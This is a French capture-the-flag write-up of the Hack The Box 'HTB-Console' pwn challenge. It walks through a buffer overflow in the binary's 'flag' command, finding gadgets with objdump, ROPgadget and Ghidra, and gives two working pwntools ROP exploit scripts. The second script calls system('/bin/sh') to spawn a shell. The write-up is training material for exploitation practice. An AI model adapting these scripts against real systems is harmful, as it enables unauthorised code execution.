# HTB-Console [Pwn] Challenge

`-- File Type --`

Le fichier est un ELF Linux 64 bit avec comme protection RX qui ne nous permet pas d’exécuter de code dans le stack nous allons donc utiliser la méthode ROP return object programmation pour faire notre but final un RCE exécuter.

`-- Le programme --`

Le programme est un shell. Nous avons plusieurs commandes disponible :

- `id` nous avons le même texte dans tous les cas
- `dir` nous avons le même texte dans tous les cas
- `flag` nous permet de rentrer une entré qui surchargé fais une erreur de segmentation. Car nous avons une première variable nous disant que la limite d’entré est de 16 mais la commande flag à le droit à 48.
- `hof` nous permet de rentrer aussi un nombre de caractères différent mais plus petit que l’original.
- `ls` va nous afficher le même tableau à chaque fois.
- `date` va exécuter la commande système ‘date’ dans le terminal.

La partie vulnérable est la commande flag et son défaut de segmentation puisque nous devons réussir le challenge avec un ROP nous allons devoir trouver un moment ou le programme utilise une commande système. 

Pour trouver ou le programme utilise une commande système nous pouvons utiliser l’outil `objdump`

`objdump -D htb-console | grep system`

Cette commande va nous afficher tous les moment dans le code de htb-console ou une commande system est utilisé

```python
┌──(root💀kali)-[/home/kali/Desktop]
└─# objdump -D htb-console | grep system                                                                                              
0000000000401040 <system@plt>:
  401381:       e8 ba fc ff ff          call   401040 <system@plt>
```

On va chercher dans ghidra cette commande avec le numéro 401381

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled.png)

Pour créé notre payload nous allons avoir besoin 

- Du padding savoir combien de caractère nous avons besoin pour réécrire sur le programme
- Une fonction Pop rdi dans le code
- D’un pointeur de string à exécute dans le code
- Et d’une exécution d’une commande system dans le code

Le padding nous l’obtenons avec la commande cyclic(x) cyclic_find(stack) et gdb.

La fonction pop rdi peux être trouver avec l’outil ROPgadget

`ROPgadget --binary htb-console`

On trouve dans le résultat de la recherche un pop rdi return

`0x0000000000401473 : pop rdi ; ret`

dans ghidra 

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled%201.png)

Pour le pointeur du string nous devons trouver une commande shell exécuter par le programme comme la commande date puis retrouver son pointeur.

Avec un double clique sur le mot “date” dans ghidra le logiciel nous amène à son pointeur.

0x00402107

A partir de la nous pouvons écrire cette exploit :

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('htb-console Exploit')
        p=process('./htb-console')

        system_address = 0x00401381
        #payload
        padding = b'a'*24
        system = p64(system_address)
        pop_rdi = p64(0x401473)
        pointer_to_string_to_execute = p64(0x00402107)
        payload = padding + pop_rdi + pointer_to_string_to_execute + system

        p.recvuntil('>> ')
        p.sendline('flag')
        p.recvuntil('Enter flag: ')
        p.sendline(payload)

        p.interactive()

if __name__ == '__main__':
        main()
```

La seul chose qu’il va réussir pour le moment est d’exécuter la commande ‘date’ dans l’entré flag pas utile pour le moment mais on peux continuer la dessus.

`-- De Date à root --`

Nous avons déjà un exploit fonctionnel pouvant lancer la commande date sans mettre la commande prévu à cette effet mais pour réussir le challenge nous devons obtenir le root

Dans le programme htb-console nous avons un endroit ou nous pouvons mettre du texte autre que flag c’est hof nous avons peux de place pour mettre quelque chose mais nous pouvons voir dans ghidra que le texte à un pointeur 

![Untitled](HTB-Console%20%5BPwn%5D%20Challenge%20c01cf6f560f4440891230dd14605c3bd/Untitled%202.png)

Nous allons donc changer l’adresse pointeur de date par celle ci et nous allons avant flag mettre dans hof /bin/sh le programme en revenant sur le pointeur ou nous avons /bin/sh va exécuté le shell de la machine et nous allons pouvoir être root.

```python
#!/usr/bin/python3

from pwn import *

def main():
        context.log_level='DEBUG'
        context.update(arch='amd64', os='linux')
        log.info('htb-console Exploit')
        p=process('./htb-console')

        system_address = 0x00401381
        #payload
        padding = b'a'*24
        system = p64(system_address)
        pop_rdi = p64(0x401473)
        pointer_to_string_to_execute = p64(0x004040b0)
        payload = padding + pop_rdi + pointer_to_string_to_execute + system

        p.sendlineafter('>>', 'hof')
        p.sendlineafter('Enter your name: ', '/bin/sh')
        p.recvuntil('>> ')
        p.sendline('flag')
        p.recvuntil('Enter flag: ')
        p.sendline(payload)

        p.interactive()

if __name__ == '__main__':
        main()
```

Avec cette epxloit nous sommes maintenant root de la machine et nous pouvons exécuter l’exploit sur un serveur distant.